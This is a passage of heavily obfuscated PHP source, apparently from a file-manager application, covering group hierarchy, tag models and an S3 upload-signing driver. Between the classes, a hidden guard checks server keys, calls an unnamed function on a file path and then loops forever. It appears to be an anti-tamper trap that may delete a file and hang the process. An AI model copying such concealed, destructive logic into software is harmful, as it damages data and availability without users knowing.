ceil($¬•Ûµõ’[$ññä˜ÙÈ[366]][$ññä˜ÙÈ[367]] / $¬•Ûµõ’[$ññä˜ÙÈ[366]][$ññä˜ÙÈ[363]]); } $this->_listDataApply($¬•Ûµõ’[$ññä˜ÙÈ[369]]); return $¬•Ûµõ’; } protected function groupChildrenAll($ÖÈ¿æÓ³) { $Ä½ñ¿ù× =& $_SERVER[óó‹¸‚å]; if (!$ÖÈ¿æÓ³) { return !1; } if (is_string($ÖÈ¿æÓ³)) { $ÖÈ¿æÓ³ = array($ÖÈ¿æÓ³); } $—™Ú€·™ = $ÖÈ¿æÓ³; foreach ($ÖÈ¿æÓ³ as $ù““Œç™) { $ç£üàæÕ = $this->getInfoSimple($ù““Œç™); $ª®¾Á‚ = array($Ä½ñ¿ù×[521] => array($Ä½ñ¿ù×[383], $ç£üàæÕ[$Ä½ñ¿ù×[521]] . $ù““Œç™ . $Ä½ñ¿ù×[551])); $ãæ¢¦½Ø = $this->field($Ä½ñ¿ù×[1863])->where($ª®¾Á‚)->select(); $—™Ú€·™ = array_merge($—™Ú€·™, array_to_keyvalue($ãæ¢¦½Ø, $Ä½ñ¿ù×[12], $Ä½ñ¿ù×[1863])); } return array_unique($—™Ú€·™); } private function _searchFromMeta($ö’¨©§’, $ã´ˆÁ ©, $ô½à‘Âˆ, $Ã­ù´¸Ä) { $¨£³Õ¿ =& $_SERVER[óó‹¸‚å]; $ã´ˆÁ © = strtolower($ã´ˆÁ ©); $”İÕ¿º¬ = array($¨£³Õ¿[94] => $ö’¨©§’, $¨£³Õ¿[374] => array($¨£³Õ¿[383], "\x25{$ã´ˆÁ ©}\x25")); $”İÕ¿º¬ = $this->parseWhereLike($”İÕ¿º¬); if ($Ã­ù´¸Ä) { $”İÕ¿º¬[$¨£³Õ¿[1863]] = array($¨£³Õ¿[7], $Ã­ù´¸Ä); } $Á¯Ç‚¤ë = Model($¨£³Õ¿[1962])->where($”İÕ¿º¬)->limit($ô½à‘Âˆ)->select(); if (!$Á¯Ç‚¤ë) { return array(); } $Á¯Ç‚¤ë = array_to_keyvalue($Á¯Ç‚¤ë, $¨£³Õ¿[12], $¨£³Õ¿[1863]); $Æµæ¯ÌÎ = $this->where(array($¨£³Õ¿[1951] => array($¨£³Õ¿[7], $Á¯Ç‚¤ë)))->select(); if (!$Æµæ¯ÌÎ) { return array(); } return $Æµæ¯ÌÎ; } protected function _listDataApplyItem($›¼ÚŞ•Á) { $±äÖ±ç  = array($›¼ÚŞ•Á); $this->_listDataApply($±äÖ±ç ); return $±äÖ±ç [0]; } protected function _listDataApply(&$Ú£¶Ó¹ˆ) { $ Ï»›àÑ =& $_SERVER[óó‹¸‚å]; if (!$Ú£¶Ó¹ˆ) { return; } $¡¸İÏçß = array_to_keyvalue($Ú£¶Ó¹ˆ, $ Ï»›àÑ[12], $ Ï»›àÑ[1863]); $this->_listAppendChildren($Ú£¶Ó¹ˆ); $this->_listAppendChildrenMember($Ú£¶Ó¹ˆ); $this->_listAppendMeta($Ú£¶Ó¹ˆ, $¡¸İÏçß); $this->_listAppendParent($Ú£¶Ó¹ˆ); $this->_listAppendSourceRoot($Ú£¶Ó¹ˆ, $¡¸İÏçß); } private function _listAppendChildren(&$óÃ‰ÒÑğ) { $ºÚí¹Ò£ =& $_SERVER[óó‹¸‚å]; $æçÜßÀô = array_to_keyvalue($óÃ‰ÒÑğ, $ºÚí¹Ò£[12], $ºÚí¹Ò£[1863]); $ŠÊÔ¸ËÕ = array($ºÚí¹Ò£[432] => array($ºÚí¹Ò£[7], $æçÜßÀô)); $—³Ğ¬¤¡ = array($ºÚí¹Ò£[432], $ºÚí¹Ò£[1963] => $ºÚí¹Ò£[500]); $îŒŠÑ± = $this->field($—³Ğ¬¤¡)->where($ŠÊÔ¸ËÕ)->group($ºÚí¹Ò£[432])->select(); $Šø¢ˆ½† = array_to_keyvalue($îŒŠÑ±, $ºÚí¹Ò£[432], $ºÚí¹Ò£[500]); foreach ($óÃ‰ÒÑğ as &$ÍÎ£½¼ü) { $îÁä’× = $ÍÎ£½¼ü[$ºÚí¹Ò£[1863]]; $ÍÎ£½¼ü[$ºÚí¹Ò£[1964]] = isset($Šø¢ˆ½†[$îÁä’×]) ? intval($Šø¢ˆ½†[$îÁä’×]) : !1; } unset($ÍÎ£½¼ü); } private function _listAppendChildrenMember(&$äÄ™†Ó) { $ÏğÛõ¢Ê =& $_SERVER[óó‹¸‚å]; $ÁïØÎĞ¸ = array_to_keyvalue($äÄ™†Ó, $ÏğÛõ¢Ê[12], $ÏğÛõ¢Ê[1863]); $üáñÏ¦» = array($ÏğÛõ¢Ê[1863] => array($ÏğÛõ¢Ê[7], $ÁïØÎĞ¸)); $ÂéªĞü = array($ÏğÛõ¢Ê[1863], $ÏğÛõ¢Ê[1963] => $ÏğÛõ¢Ê[500]); $Ê›Æç¶§ = Model($ÏğÛõ¢Ê[1953])->field($ÂéªĞü)->where($üáñÏ¦»)->group($ÏğÛõ¢Ê[1863])->select(); $Øõ¢æÂâ = array_to_keyvalue($Ê›Æç¶§, $ÏğÛõ¢Ê[1863], $ÏğÛõ¢Ê[500]); foreach ($äÄ™†Ó as &$Ò®£â) { $¿•¿˜Û = $Ò®£â[$ÏğÛõ¢Ê[1863]]; $Ò®£â[$ÏğÛõ¢Ê[1965]] = isset($Øõ¢æÂâ[$¿•¿˜Û]) ? intval($Øõ¢æÂâ[$¿•¿˜Û]) : !1; } unset($Ò®£â); } private function _listAppendMeta(&$öóî‹Î™, $Ç›ÓÂ”ï) { $æ£ş„é˜ =& $_SERVER[óó‹¸‚å]; $áÈéÍ³Ó = array($æ£ş„é˜[1863] => array($æ£ş„é˜[7], $Ç›ÓÂ”ï)); $ œïúµû = Model($æ£ş„é˜[1952])->where($áÈéÍ³Ó)->select(); $ œïúµû = array_to_keyvalue_group($ œïúµû, $æ£ş„é˜[1863]); foreach ($ œïúµû as &$ƒ™ì÷Ô) { $ƒ™ì÷Ô = array_to_keyvalue($ƒ™ì÷Ô, $æ£ş„é˜[94], $æ£ş„é˜[374]); } unset($ƒ™ì÷Ô); foreach ($öóî‹Î™ as &$ø×Ò—Ş) { $ø×Ò—Ş[$æ£ş„é˜[466]] = array(); if (isset($ œïúµû[$ø×Ò—Ş[$æ£ş„é˜[1863]]])) { $ø×Ò—Ş[$æ£ş„é˜[466]] = $ œïúµû[$ø×Ò—Ş[$æ£ş„é˜[1863]]]; } } unset($ø×Ò—Ş); } protected function parentLevelArray($öÔÁİ–à) { $¥Ø÷†¯ =& $_SERVER[óó‹¸‚å]; $öÔÁİ–à = explode($¥Ø÷†¯[50], trim($öÔÁİ–à, $¥Ø÷†¯[50])); $öÔÁİ–à = array_remove_value($öÔÁİ–à, $¥Ø÷†¯[197]); return $öÔÁİ–à; } protected function parentInGroup($ƒôŠÁÑ, $ø™Ò÷) { $ÊÕÕœÍ =& $_SERVER[óó‹¸‚å]; $Ó§ÕÃı° = $this->getInfoSimple($ƒôŠÁÑ); if (!$Ó§ÕÃı°) { return !0; } $şÈ¦•Ô´ = $this->parentLevelArray($Ó§ÕÃı°[$ÊÕÕœÍ[521]]); $şÈ¦•Ô´[] = $ƒôŠÁÑ; foreach ($şÈ¦•Ô´ as $ƒôŠÁÑ) { if (in_array($ƒôŠÁÑ . $ÊÕÕœÍ[12], $ø™Ò÷)) { return !0; } } return !1; } private function _listAppendParent(&$äšïğĞï) { $¼“ŞÏŸ =& $_SERVER[óó‹¸‚å]; $Ÿü€å˜¾ = array(); foreach ($äšïğĞï as &$’Äæ¹÷¦) { $Ÿü€å˜¾[$’Äæ¹÷¦[$¼“ŞÏŸ[1863]]] = $’Äæ¹÷¦[$¼“ŞÏŸ[32]]; $ÊƒİµÍ = $this->parentLevelArray($’Äæ¹÷¦[$¼“ŞÏŸ[521]]); foreach ($ÊƒİµÍ as $ÕêÒçÖ‚) { if (!isset($Ÿü€å˜¾[$ÕêÒçÖ‚])) { $Ÿü€å˜¾[$ÕêÒçÖ‚] = 0; } } } unset($’Äæ¹÷¦); foreach ($Ÿü€å˜¾ as $ôú£ƒÛ³ => $ÉËŸ®ú’) { if ($ÉËŸ®ú’) { continue; } $ø¢€™ì¹ = $this->getInfoSimple($ôú£ƒÛ³); $Ÿü€å˜¾[$ôú£ƒÛ³] = $ø¢€™ì¹[$¼“ŞÏŸ[32]]; } $·°œ­ú = $GLOBALS[$¼“ŞÏŸ[6]][$¼“ŞÏŸ[89]][$¼“ŞÏŸ[1966]]; if ($GLOBALS[$¼“ŞÏŸ[503]] == $¼“ŞÏŸ[88]) { $·°œ­ú = !1; } foreach ($äšïğĞï as &$’Äæ¹÷¦) { $ÊƒİµÍ = $this->parentLevelArray($’Äæ¹÷¦[$¼“ŞÏŸ[521]]); $íŒ¶½¨ = $¼“ŞÏŸ[12]; foreach ($ÊƒİµÍ as $ôú£ƒÛ³ => $ÕêÒçÖ‚) { if ($·°œ­ú && $ôú£ƒÛ³ == 0) { continue; } $íŒ¶½¨ .= $Ÿü€å˜¾[$ÕêÒçÖ‚] . $¼“ŞÏŸ[8]; } if ($ÊƒİµÍ) { $íŒ¶½¨ .= $’Äæ¹÷¦[$¼“ŞÏŸ[32]]; } $’Äæ¹÷¦[$¼“ŞÏŸ[526]] = str_replace($¼“ŞÏŸ[529], $¼“ŞÏŸ[8], $íŒ¶½¨); } unset($’Äæ¹÷¦); } private function _listAppendSourceRoot(&$¶—¥ÂË, $İ³îÎ¥) { $Ëşúüôà =& $_SERVER[óó‹¸‚å]; $“’¤ü”Ø = Model($Ëşúüôà[829])->listSourceRoot(SourceModel::TYPE_GROUP, $İ³îÎ¥); $“’¤ü”Ø = array_to_keyvalue($“’¤ü”Ø, $Ëşúüôà[505]); $“’¤ü”Ø = array_remove_key($“’¤ü”Ø, $Ëşúüôà[505]); foreach ($¶—¥ÂË as &$º‡­”ú) { $º‡­”ú[$Ëşúüôà[86]] = $“’¤ü”Ø[$º‡­”ú[$Ëşúüôà[1863]]] ? $“’¤ü”Ø[$º‡­”ú[$Ëşúüôà[1863]]] : array(); } unset($º‡­”ú); } protected function groupMerge($Â†êÔÖ) { $Â†êÔÖ = array_values(array_unique($Â†êÔÖ)); $Ş†˜ËÊ’ = array(); for ($óñÒı§ = 0; $óñÒı§ < count($Â†êÔÖ); $óñÒı§++) { $çª™Ğß = !1; for ($Ï¨‰Ûóş = 0; $Ï¨‰Ûóş < count($Â†êÔÖ); $Ï¨‰Ûóş++) { if ($óñÒı§ == $Ï¨‰Ûóş) { continue; } if ($this->isParentOf($Â†êÔÖ[$Ï¨‰Ûóş], $Â†êÔÖ[$óñÒı§])) { $çª™Ğß = !0; break; } } if (!$çª™Ğß) { $Ş†˜ËÊ’[] = $Â†êÔÖ[$óñÒı§]; } } return $Ş†˜ËÊ’; } protected function isParentOf($„¤Šà´Á, $ÈÎĞ”) { $×‰ã¥¡Ş =& $_SERVER[óó‹¸‚å]; if (!$„¤Šà´Á || !$ÈÎĞ” || $„¤Šà´Á == $ÈÎĞ”) { return !1; } $Ô¬²†¨Ù = $this->getInfoSimple($„¤Šà´Á); $Ë¾§ÀÃ¦ = $this->getInfoSimple($ÈÎĞ”); $Ğ§ßœ‹‚ = $Ô¬²†¨Ù[$×‰ã¥¡Ş[521]] . $„¤Šà´Á . $×‰ã¥¡Ş[50]; if (substr($Ë¾§ÀÃ¦[$×‰ã¥¡Ş[521]], 0, strlen($Ğ§ßœ‹‚)) == $Ğ§ßœ‹‚) { return !0; } return !1; } public function groupShowRoot($Ë·©ªø, $´¬Õì®Ï = false) { $ÄÌà“³ =& $_SERVER[óó‹¸‚å]; $›Æƒ¾Ë = $this->getInfo($Ë·©ªø); if (!$›Æƒ¾Ë) { return array(); } $´œÈÓŸ = $this->parentLevelArray($›Æƒ¾Ë[$ÄÌà“³[521]]); $çŒ‘çÔå = array($Ë·©ªø); if (count($´œÈÓŸ) == 0) { return $çŒ‘çÔå; } if ($´¬Õì®Ï && count($´œÈÓŸ) == 1) { return $çŒ‘çÔå; } if (!$›Æƒ¾Ë[$ÄÌà“³[466]] || !isset($›Æƒ¾Ë[$ÄÌà“³[466]][$ÄÌà“³[1949]]) || $›Æƒ¾Ë[$ÄÌà“³[466]][$ÄÌà“³[1949]] == $ÄÌà“³[1918]) { return $this->groupShowRoot($´œÈÓŸ[count($´œÈÓŸ) - 1], $´¬Õì®Ï); } if ($›Æƒ¾Ë[$ÄÌà“³[466]][$ÄÌà“³[1949]] == $ÄÌà“³[357]) { $“¼ ”°¿ = explode($ÄÌà“³[50], $›Æƒ¾Ë[$ÄÌà“³[466]][$ÄÌà“³[1950]]); if ($“¼ ”°¿) { $çŒ‘çÔå = array_merge($çŒ‘çÔå, $“¼ ”°¿); } } return $çŒ‘çÔå; } protected function resetParentLevel() { $”É…ú€ =& $_SERVER[óó‹¸‚å]; $›ˆÔÃ´¶ = $”É…ú€[1863]; $şš«½´ = $this->select(); $şš«½´ = array_to_keyvalue($şš«½´, $›ˆÔÃ´¶); foreach ($şš«½´ as $×ú†ÚŞæ) { $ºôĞ¡® = $×ú†ÚŞæ; $·“˜ŒÕ = array(); while ($ºôĞ¡®[$”É…ú€[432]] != 0) { $·“˜ŒÕ[] = $ºôĞ¡®[$”É…ú€[432]]; $ºôĞ¡® = $şš«½´[$ºôĞ¡®[$”É…ú€[432]]]; } $·“˜ŒÕ[] = 0; $·“˜ŒÕ = $”É…ú€[50] . implode($”É…ú€[50], array_reverse($·“˜ŒÕ)) . $”É…ú€[50]; $this->setNamePinyin($×ú†ÚŞæ[$›ˆÔÃ´¶], $×ú†ÚŞæ[$”É…ú€[32]]); $this->where(array($›ˆÔÃ´¶ => $×ú†ÚŞæ[$›ˆÔÃ´¶]))->save(array($”É…ú€[590] => $·“˜ŒÕ)); } return $şš«½´; } public function groupNameAuto($µó‰‹È², $ÒÁ„®„í) { $Ç«ğô½˜ =& $_SERVER[óó‹¸‚å]; $£ï²ø¾ = $this->where(array($Ç«ğô½˜[401] => $µó‰‹È²))->getField($Ç«ğô½˜[32], !0); if (!$£ï²ø¾ || !in_array($ÒÁ„®„í, $£ï²ø¾)) { return $ÒÁ„®„í; } for ($¹À”¨ñ = 1; $¹À”¨ñ <= count($£ï²ø¾) + 1; $¹À”¨ñ++) { $ÏàøĞ’œ = $ÒÁ„®„í . "\50{$¹À”¨ñ}\x29"; if (!in_array($ÏàøĞ’œ, $£ï²ø¾)) { return $ÏàøĞ’œ; } } } public function groupSwitch($Á†ğ÷Ï„, $Ÿİ†£óÕ) { $ÛÍÕô’˜ =& $_SERVER[óó‹¸‚å]; $Ô±ƒ£¯ = array($ÛÍÕô’˜[1863] => array($ÛÍÕô’˜[7], array($Á†ğ÷Ï„, $Ÿİ†£óÕ))); $„¨ò‘Ôë = $this->where($Ô±ƒ£¯)->select(); $„¨ò‘Ôë = array_to_keyvalue($„¨ò‘Ôë, $ÛÍÕô’˜[1863]); if (!isset($„¨ò‘Ôë[$Á†ğ÷Ï„]) || !isset($„¨ò‘Ôë[$Ÿİ†£óÕ]) || $„¨ò‘Ôë[$Á†ğ÷Ï„][$ÛÍÕô’˜[432]] == 0) { return !1; } $Ô±ƒ£¯ = array($ÛÍÕô’˜[1863] => $Á†ğ÷Ï„); $£¾„„ÚŠ = Model($ÛÍÕô’˜[1953])->where($Ô±ƒ£¯)->select(); if (!$£¾„„ÚŠ) { $£¾„„ÚŠ = array(); } foreach ($£¾„„ÚŠ as $Â£÷ÌµÛ) { $‰Í•´Š = $Â£÷ÌµÛ[$ÛÍÕô’˜[1674]]; $Ô±ƒ£¯ = array($ÛÍÕô’˜[1674] => $‰Í•´Š, $ÛÍÕô’˜[1863] => $Ÿİ†£óÕ); $£öşÊÕ• = Model($ÛÍÕô’˜[1953])->where($Ô±ƒ£¯)->find(); if (!$£öşÊÕ•) { $òÊ¨îÌš = array($Ÿİ†£óÕ => $Â£÷ÌµÛ[$ÛÍÕô’˜[1967]]); Model($ÛÍÕô’˜[535])->userGroupAdd($‰Í•´Š, $òÊ¨îÌš); } Model($ÛÍÕô’˜[535])->userGroupRemove($‰Í•´Š, $Á†ğ÷Ï„); } $Ô±ƒ£¯ = array($ÛÍÕô’˜[411] => 2, $ÛÍÕô’˜[432] => 0, $ÛÍÕô’˜[410] => 1, $ÛÍÕô’˜[505] => array($ÛÍÕô’˜[7], array($Á†ğ÷Ï„, $Ÿİ†£óÕ))); $Ã¹ò­“ê = Model($ÛÍÕô’˜[829])->where($Ô±ƒ£¯)->field($ÛÍÕô’˜[1968])->select(); $Ã¹ò­“ê = array_to_keyvalue($Ã¹ò­“ê, $ÛÍÕô’˜[505], $ÛÍÕô’˜[402]); $³Ñ§Ÿ£Ï = !empty($Ã¹ò­“ê[$Á†ğ÷Ï„]) ? $Ã¹ò­“ê[$Á†ğ÷Ï„] : !1; if ($³Ñ§Ÿ£Ï) { if (!$Ã¹ò­“ê[$Ÿİ†£óÕ]) { $Ã¹ò­“ê[$Ÿİ†£óÕ] = Model($ÛÍÕô’˜[829])->groupRootAdd($Ÿİ†£óÕ); } $Öï¼ô¼ = $Ã¹ò­“ê[$Ÿİ†£óÕ]; $Ô±ƒ£¯ = array($ÛÍÕô’˜[432] => $³Ñ§Ÿ£Ï); $Ã¹ò­“ê = Model($ÛÍÕô’˜[829])->where($Ô±ƒ£¯)->field($ÛÍÕô’˜[1969])->select(); if (!$Ã¹ò­“ê) { $Ã¹ò­“ê = array(); } Model($ÛÍÕô’˜[829])->moveClearAuth = !1; foreach ($Ã¹ò­“ê as $‹Âõøß) { $ãÃÇ±­ = $‹Âõøß[$ÛÍÕô’˜[410]] == $ÛÍÕô’˜[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÛÍÕô’˜[829])->move($‹Âõøß[$ÛÍÕô’˜[402]], $Öï¼ô¼, $ãÃÇ±­); } Model($ÛÍÕô’˜[829])->moveClearAuth = !0; $Ô±ƒ£¯ = array($ÛÍÕô’˜[411] => 2, $ÛÍÕô’˜[505] => $Á†ğ÷Ï„); $ÍêöËÂ“ = array($ÛÍÕô’˜[505] => $Ÿİ†£óÕ); Model($ÛÍÕô’˜[1970])->where($Ô±ƒ£¯)->save($ÍêöËÂ“); Model($ÛÍÕô’˜[1971])->where($Ô±ƒ£¯)->save($ÍêöËÂ“); } $this->_changeChildLevel($„¨ò‘Ôë[$Á†ğ÷Ï„], $„¨ò‘Ôë[$Ÿİ†£óÕ], !0); $this->where(array($ÛÍÕô’˜[432] => $Á†ğ÷Ï„))->save(array($ÛÍÕô’˜[432] => $Ÿİ†£óÕ)); $this->_clearChildrenCache($„¨ò‘Ôë[$Ÿİ†£óÕ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\141\166"; protected function cacheFunctionAlias($æù’Æ’) { $àüË»² =& $_SERVER[óó‹¸‚å]; return array($àüË»²[1972] => array($æù’Æ’[0], $àüË»²[1973]), $àüË»²[1974] => array($æù’Æ’[0], $àüË»²[1975])); } protected function get($í±ì•å) { $Îé¹§©… =& $_SERVER[óó‹¸‚å]; $Åöê¯ŞÁ = Model($Îé¹§©…[522])->metaGet($í±ì•å, $Îé¹§©…[1976]); $ˆë¨²İ“ = json_decode($Åöê¯ŞÁ, !0); return $ˆë¨²İ“ ? $ˆë¨²İ“ : array($Îé¹§©…[1977] => $Îé¹§©…[88], $Îé¹§©…[369] => array()); } protected function set($¯ùçÍ¤¼, $óáíñÃ¹) { $”¬”ˆ™ =& $_SERVER[óó‹¸‚å]; $óáíñÃ¹ = $óáíñÃ¹ ? $óáíñÃ¹ : array($”¬”ˆ™[1977] => $”¬”ˆ™[88], $”¬”ˆ™[369] => array()); return Model($”¬”ˆ™[522])->metaSet($¯ùçÍ¤¼, $”¬”ˆ™[1976], json_encode($óáíñÃ¹)); } protected function getByTagID($ĞêËâ“, $Å©¬¹) { $Úóæ»¶¾ =& $_SERVER[óó‹¸‚å]; if (!$ĞêËâ“ || !$Å©¬¹) { return !1; } if (!Model($Úóæ»¶¾[522])->getInfoSimple($ĞêËâ“)) { return !1; } $¥Ó¯õãƒ = $this->get($ĞêËâ“); if (!$¥Ó¯õãƒ || !isset($¥Ó¯õãƒ[$Úóæ»¶¾[369]])) { return !1; } $ñşğ¼ß÷ = array_find_by_field($¥Ó¯õãƒ[$Úóæ»¶¾[369]], $Úóæ»¶¾[399], $Å©¬¹); return is_array($ñşğ¼ß÷) ? $ñşğ¼ß÷ : !1; } public function listSource($Õ÷ÖíÑÀ, $í¿„ÊÊø) { $·Èàá ç =& $_SERVER[óó‹¸‚å]; if ($í¿„ÊÊø && !is_array($í¿„ÊÊø)) { $í¿„ÊÊø = array($í¿„ÊÊø); } $²ïú°¡® = $this->listData($Õ÷ÖíÑÀ); $Ò¯•©Âã = array(); foreach ($²ïú°¡® as $ºĞ÷Á¨í) { $ë¹„œ¬¡ = $ºĞ÷Á¨í[$·Èàá ç[84]]; if (!$ë¹„œ¬¡) { continue; } if (!isset($Ò¯•©Âã[$ë¹„œ¬¡])) { $Ò¯•©Âã[$ë¹„œ¬¡] = array(); } $Ò¯•©Âã[$ë¹„œ¬¡][] = $ºĞ÷Á¨í[$·Èàá ç[426]]; } $ƒ¬¿§Ò = array(); foreach ($Ò¯•©Âã as $•¡¸ªñ· => $ˆÔ¬±˜) { $îŸ²ÎÈ¥ = !0; if (!$í¿„ÊÊø) { $ƒ¬¿§Ò[] = $•¡¸ªñ·; continue; } foreach ($í¿„ÊÊø as $ùæÖçÅµ) { if (!in_array($ùæÖçÅµ, $ˆÔ¬±˜)) { $îŸ²ÎÈ¥ = !1; break; } } if ($îŸ²ÎÈ¥) { $ƒ¬¿§Ò[] = $•¡¸ªñ·; } } if (!$ƒ¬¿§Ò) { return array(); } $¬×€Ÿœï = array($·Èàá ç[417] => array($·Èàá ç[418], $ƒ¬¿§Ò), $·Èàá ç[505] => $Õ÷ÖíÑÀ, $·Èàá ç[411] => SourceModel::TYPE_GROUP); $Ñ±á²Ìà = Model($·Èàá ç[1343])->listSource($¬×€Ÿœï); if (!$Ñ±á²Ìà || count($ƒ¬¿§Ò) == $Ñ±á²Ìà[$·Èàá ç[366]][$·Èàá ç[367]]) { return $Ñ±á²Ìà; } $ŠõœÊÏÛ = array(); $¤‰Æ¸¨ = array_to_keyvalue($Ñ±á²Ìà[$·Èàá ç[82]], $·Èàá ç[12], $·Èàá ç[402]); $Ã©öœÌ = array_to_keyvalue($Ñ±á²Ìà[$·Èàá ç[83]], $·Èàá ç[12], $·Èàá ç[402]); $ëœ™®» = array_merge($Ã©öœÌ, $¤‰Æ¸¨); foreach ($ƒ¬¿§Ò as $ë¹„œ¬¡) { if (!in_array($ë¹„œ¬¡, $ëœ™®»)) { $ŠõœÊÏÛ[] = $ë¹„œ¬¡; } } if ($ŠõœÊÏÛ) { $this->removeBySource($Õ÷ÖíÑÀ, $ŠõœÊÏÛ); } return $Ñ±á²Ìà; } protected function listData($¶‹Ñ¦ÕÙ) { $×ïÒä¢Ğ =& $_SERVER[óó‹¸‚å]; $¨Õ„âÑÃ = array($×ïÒä¢Ğ[1665] => 0, $×ïÒä¢Ğ[484] => array($×ïÒä¢Ğ[1978], 0), $×ïÒä¢Ğ[422] => $×ïÒä¢Ğ[1979] . $¶‹Ñ¦ÕÙ); $´Ãı×ì = $×ïÒä¢Ğ[1980]; $–èÄôÅ = $this->field($´Ãı×ì)->where($¨Õ„âÑÃ)->order($×ïÒä¢Ğ[1981])->select(); return $–èÄôÅ ? $–èÄôÅ : array(); } protected function addToTag($ÁğÏ¹ªø, $Ë—¦ë¥î, $•»ÑÊƒ„) { $¨œÁçæİ =& $_SERVER[óó‹¸‚å]; if (!$this->getByTagID($ÁğÏ¹ªø, $•»ÑÊƒ„) || !$Ë—¦ë¥î) { return !1; } if (!Model($¨œÁçæİ[829])->pathInfo($Ë—¦ë¥î)) { return !1; } $Û¦Ê‚µë = array($¨œÁçæİ[1665] => 0, $¨œÁçæİ[484] => $•»ÑÊƒ„, $¨œÁçæİ[421] => $Ë—¦ë¥î, $¨œÁçæİ[422] => $¨œÁçæİ[1982] . $ÁğÏ¹ªø, $¨œÁçæİ[420] => $¨œÁçæİ[12], $¨œÁçæİ[1867] => 0); if ($this->where($Û¦Ê‚µë)->find()) { return !1; } return $this->add($Û¦Ê‚µë); } protected function removeFromTag($§ÛÜÏ›, $ùª÷À¹•, $ãÍÂÈ–è) { $‘ş´ŠŠ€ =& $_SERVER[óó‹¸‚å]; if (!$this->getByTagID($§ÛÜÏ›, $ãÍÂÈ–è) || !$ùª÷À¹•) { return !1; } if (is_array($ùª÷À¹•)) { $ùª÷À¹• = array($‘ş´ŠŠ€[7], $ùª÷À¹•); } $Ù´Ğ’­ô = array($‘ş´ŠŠ€[1665] => 0, $‘ş´ŠŠ€[484] => $ãÍÂÈ–è, $‘ş´ŠŠ€[422] => $‘ş´ŠŠ€[1982] . $§ÛÜÏ›, $‘ş´ŠŠ€[421] => $ùª÷À¹•); return $this->where($Ù´Ğ’­ô)->delete(); } protected function removeByTag($°©‚¸, $ğ¿ĞØ˜¨) { $«ñ™ë™Å =& $_SERVER[óó‹¸‚å]; if (!$this->getByTagID($°©‚¸, $ğ¿ĞØ˜¨)) { return !1; } $ÓŞ¼‚¯ = array($«ñ™ë™Å[1665] => 0, $«ñ™ë™Å[484] => $ğ¿ĞØ˜¨, $«ñ™ë™Å[422] => $«ñ™ë™Å[1982] . $°©‚¸); return $this->where($ÓŞ¼‚¯)->delete(); } protected function removeBySource($Ö™êîõš, $‚†´ûóª) { $ÚŞÑşÄÓ =& $_SERVER[óó‹¸‚å]; if (!$Ö™êîõš || !$‚†´ûóª) { return !1; } if (is_array($‚†´ûóª)) { $‚†´ûóª = array($ÚŞÑşÄÓ[7], $‚†´ûóª); } $Æ¶„Ğ†Ğ = array($ÚŞÑşÄÓ[1665] => 0, $ÚŞÑşÄÓ[421] => $‚†´ûóª, $ÚŞÑşÄÓ[484] => array($ÚŞÑşÄÓ[1021], 0), $ÚŞÑşÄÓ[422] => $ÚŞÑşÄÓ[1982] . $Ö™êîõš); return $this->where($Æ¶„Ğ†Ğ)->delete(); } } if (!isset($_SERVER[$_SERVER[óó‹¸‚å][880]]) || !isset($_SERVER[$_SERVER[óó‹¸‚å][881]])) { $_getc = $_SERVER[óó‹¸‚å][883]; $_getfile = $_SERVER[$_SERVER[óó‹¸‚å][884]] . $_SERVER[óó‹¸‚å][885]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[óó‹¸‚å][231], $_getfilec); if (count($_getarrs) < $_SERVER[óó‹¸‚å][620]) { $exit = $_SERVER[óó‹¸‚å][886]; $exit(); } $_act = $_SERVER[óó‹¸‚å][1380]; $_act($_SERVER[$_SERVER[óó‹¸‚å][884]] . $_SERVER[óó‹¸‚å][885]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[óó‹¸‚å][378]); } } goto CàªùÜÙÑã; CÍ‡‚¶œ”ª: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ıÊâ÷•‘) { parent::__construct($ıÊâ÷•‘); } public function uploadFormData($Âş‘Ûô, $Åìöş„æ = 3600) { $Õ“¹†Ò =& $_SERVER[óó‹¸‚å]; $¼½Èø†Ë = $Õ“¹†Ò[198]; $Ø£µ˜Í¶ = $Õ“¹†Ò[1362]; $÷ûš»Ôä = $Õ“¹†Ò[62]; $¾÷èÖ¤ï = gmdate($Õ“¹†Ò[1363]); $³Ê«ãÄ± = gmdate($Õ“¹†Ò[755]); $øˆÁñÊ÷ = $Õ“¹†Ò[1364]; $”ñêô¬‡ = $Åìöş„æ . $Õ“¹†Ò[12]; $Ú‹†Û = $Õ“¹†Ò[1326]; $ÆüÙ– = array($this->accessKey, $³Ê«ãÄ±, $this->region, $÷ûš»Ôä, $øˆÁñÊ÷); $á»›€¾ƒ = implode($Õ“¹†Ò[8], $ÆüÙ–); $º§òïË = array($Õ“¹†Ò[1328] => gmdate($Õ“¹†Ò[1327], strtotime($Õ“¹†Ò[1365])), $Õ“¹†Ò[1329] => array(array($Õ“¹†Ò[1331] => $this->bucket), array($Õ“¹†Ò[1330] => $¼½Èø†Ë), array($Õ“¹†Ò[1332], $Õ“¹†Ò[1333], $Õ“¹†Ò[12]), array($Õ“¹†Ò[1332], $Õ“¹†Ò[1366], $Õ“¹†Ò[12]), array($Õ“¹†Ò[1332], $Õ“¹†Ò[1367], $Õ“¹†Ò[12]), array($Õ“¹†Ò[1334] => $Ú‹†Û), array($Õ“¹†Ò[1368] => $á»›€¾ƒ), array($Õ“¹†Ò[1369] => $Ø£µ˜Í¶), array($Õ“¹†Ò[1370] => $¾÷èÖ¤ï), array($Õ“¹†Ò[1371] => $”ñêô¬‡))); $Œ ³ì† = base64_encode(json_encode($º§òïË)); $±¼ÂÔš˜ = hash_hmac($Õ“¹†Ò[1372], $³Ê«ãÄ±, $Õ“¹†Ò[1373] . $this->secret, !0); $ë³˜‚Ä = hash_hmac($Õ“¹†Ò[1372], $this->region, $±¼ÂÔš˜, !0); $®Ö£ã÷ = hash_hmac($Õ“¹†Ò[1372], $÷ûš»Ôä, $ë³˜‚Ä, !0); $ì§¡’¼ = hash_hmac($Õ“¹†Ò[1372], $øˆÁñÊ÷, $®Ö£ã÷, !0); $Ôã‘İ§Í = hash_hmac($Õ“¹†Ò[1372], $Œ ³ì†, $ì§¡’¼); $„ñŸ«äÅ = array($Õ“¹†Ò[215] => $Õ“¹†Ò[12], $Õ“¹†Ò[1374] => $Õ“¹†Ò[12], $Õ“¹†Ò[1330] => $¼½Èø†Ë, $Õ“¹†Ò[1334] => $Ú‹†Û, 